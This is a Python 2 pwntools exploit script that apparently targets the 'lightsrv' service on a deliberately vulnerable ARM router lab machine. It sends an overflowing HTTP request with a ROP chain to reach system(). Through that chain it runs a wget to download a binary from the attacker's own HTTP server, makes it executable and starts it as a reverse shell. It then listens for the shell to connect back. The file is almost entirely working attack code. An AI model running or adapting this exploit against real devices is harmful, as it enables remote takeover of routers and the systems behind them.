#!/usr/bin/python2
#for hosting a http server to DL from
import SimpleHTTPServer
import SocketServer
#and ye olden pwntools
from pwn import *

def httpserv():
	httpd = SocketServer.TCPServer(("", 8000), SimpleHTTPServer.SimpleHTTPRequestHandler)
	print "serving at port", 8000
	httpd.serve_forever()



def execmd(command):
		##ip of the dvar
	s = remote('172.16.99.129', '8080');
	s.send('GET /' + 'A' * 0xffb);
	buf = command + 'A' * (36 - len(command));
	s.send(buf);
	s.send(p32(0x00010940)); #: pop (r0, lr); bx lr
	s.send(p32(0x221d0)); #: address of the temporary buffer
	s.send(p32(0x10e28)); #: bl sym.imp.system
	s.send('d'*4);
	s.send('\n\n');
	s.close();

def sploit():
	sleep(2)
	print('downloading reverse shell')
	execmd('wget http://172.16.99.1:8000/r\0')
	sleep(1)
	print('setting execute')
	execmd('chmod +x ./r\0')
	sleep(1)
	print('starting reverse shell')
	execmd('./r\0')

#need to run the http server at the same time we issue "commands" to the lightsrv
from pwnlib.context import Thread as PwnThread

PwnThread(target=httpserv).start()
PwnThread(target=sploit).start()
l = listen(26985)
l.wait_for_connection()
l.interactive()
